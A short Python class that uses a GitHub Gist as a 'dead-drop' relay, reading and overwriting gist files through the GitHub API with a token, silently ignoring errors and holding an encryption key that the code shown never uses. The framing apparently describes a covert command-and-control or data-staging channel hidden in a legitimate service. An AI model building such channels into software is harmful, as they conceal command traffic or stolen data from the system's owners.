import requests
import base64
import json

class GitHubRelay:
    """Relay using GitHub Gist as a dead‑drop."""
    def __init__(self, token: str, gist_id: str, enc_key: bytes):
        self.token = token
        self.gist_id = gist_id
        self.enc_key = enc_key
        self.api_base = "https://api.github.com/gists"
        self.headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }

    def read_file(self, filename: str) -> str:
        """Read the content of a file in the Gist."""
        url = f"{self.api_base}/{self.gist_id}"
        try:
            resp = requests.get(url, headers=self.headers)
            if resp.status_code == 200:
                files = resp.json()["files"]
                if filename in files:
                    return files[filename]["content"]
        except Exception:
            pass
        return ""

    def write_file(self, filename: str, content: str):
        """Write content to a file in the Gist."""
        url = f"{self.api_base}/{self.gist_id}"
        payload = {
            "files": {
                filename: {"content": content}
            }
        }
        try:
            requests.patch(url, headers=self.headers, json=payload)
        except Exception:
            pass
